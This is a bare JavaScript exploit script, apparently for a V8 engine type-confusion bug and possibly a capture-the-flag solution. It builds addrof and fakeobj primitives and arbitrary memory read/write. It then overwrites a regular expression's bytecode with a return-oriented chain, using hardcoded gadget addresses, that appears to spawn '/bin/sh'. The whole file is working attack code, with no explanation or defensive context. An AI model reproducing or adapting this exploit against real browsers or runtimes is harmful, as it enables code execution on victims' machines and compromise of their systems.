var i64 = new BigInt64Array(1);
var f64 = new Float64Array(i64.buffer);

// helper function
function f2i(x) {
  f64[0] = x;
  return i64[0];
}

function i2f(x) {
  i64[0] = x;
  return f64[0];
}

// concat 2 integer
function toUint64(upper, lower) {
    return (upper << 32n) + lower;
}

// print utils
function hex(v) {
    return "0x" + v.toString(16);
}

function upper(x) {
    return x / 0x100000000n;
  }
  
function lower(x) {
    return x & 0xffffffffn;
}

// --------------------------------------------------



function opt_float_arr(l) {
    let x = l.length;
    return l[(x >> 16)];
}

function opt_obj_arr(l) {
    let x = l.length;
    return l[(x >> 16)];
}

function fire() {
    console.log("[*] Triggering type confusion 1...");
    let tmp = [3.3, 4.4];
    for (let i = 0; i < 0x100000000; i++) {
        opt_float_arr(tmp);
    }
    console.log("[*] Triggering type confusion 2...");
    let tmp2 = [{X:1}, {Y:2}];
    for (let i = 0; i < 0x100000000; i++) {
        opt_obj_arr(tmp2);
    }
}


fire()
function addrof(obj) {
    let tmp = [obj];
    return f2i(opt_float_arr(tmp));
}
function fakeobj(addr) {
    let tmp = [i2f(addr)];
    return opt_obj_arr(tmp);
}
let testObj = [1.1, 2.2, 3.3];
let leak = addrof(testObj);
console.log("[+] testObj: ",hex(lower(leak)));
fake_map = upper(leak) - 128n;
console.log("[+] fakemap: ",hex(fake_map));
forged = [i2f(fake_map), 2.2, 2.3, 2.4];
fake_obj = fakeobj(lower(addrof(forged)) - 0x20n);
console.log("[+] fake_obj:",hex(lower(addrof(fake_obj))));
function read64(addr) {
    forged[1] = i2f(2n<<32n|(addr - 8n));
    return f2i(fake_obj[0]);
}
function write64(addr, value){
    forged[1] = i2f((2n << 32n) | (addr - 8n));
    fake_obj[0] = i2f(value);
}

let s = "aaaaa";
var regex = /[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*[a-zA-Z0-9]*/g;
// %DebugPrint(regex);
let addr_regex = lower(addrof(regex));
console.log("[+] regex:",hex(addr_regex));
let data_addr = lower(read64(addr_regex + 0xcn));
console.log("[+] data_addr:",hex(data_addr));
regex.exec(s);
function writeHeap4(offset, value) {
    let initial = read64(offset);
    initial = BigInt(initial & 0xffffffff00000000n);
    write64(offset, initial | value);
}
function readHeap4(offset){
    return lower(read64(offset));
}
let bytecode = readHeap4(data_addr + 0x1bn+1n);
console.log("[+] bytecode:",hex(bytecode));
writeHeap4(data_addr + 0x2fn + 1n, 2n);

let arr = [];
function push_reg(idx) {
    arr.push((idx << 8) & 0xffffff00 | 0x03);
}

function pop_reg(idx) {
    arr.push((idx << 8) & 0xffffff00 | 0x0c);
}

function mov_reg1_to_reg2(idx1, idx2) {
    push_reg(idx1);
    pop_reg(idx2);
}

function advance_reg(idx, value) {
    arr.push((idx << 8) & 0xffffff00 | 0x09);
    arr.push(value);
}

function set_reg(idx, value) {
    arr.push((idx << 8) & 0xffffff00 | 0x08);
    arr.push(value);
}

function success() {
    arr.push(0x0000000e);
}

function add_gadget(addr) {
    mov_reg1_to_reg2(3, 5);
    advance_reg(5, addr);
    mov_reg1_to_reg2(5, idx++);
    mov_reg1_to_reg2(4, idx++);
}
let idx = 0x52;
mov_reg1_to_reg2(0x53, 4);
mov_reg1_to_reg2(0x52, 3);
advance_reg(0x3,0xfe916ea0);
add_gadget(0x00000000014b7dfa) 
set_reg(idx++, 0x6e69622f);
set_reg(idx++, 0x0068732f);
add_gadget(0x00000000011fee5e);
add_gadget(41312256);
add_gadget(0x00000000016dbde3);
add_gadget(0x00000000016c10e6);
add_gadget(41312256);
add_gadget(0x00000000011fee5e);
add_gadget(41312256+8);
add_gadget(0x00000000014b7dfa); 
add_gadget(41312256+8);
add_gadget(0x26cb210);
success();

for (var i = 0; i < arr.length; i++) {
    writeHeap4(bytecode + 0x7n + 4n * BigInt(i) + 1n, BigInt(arr[i]));
}
regex.exec(s);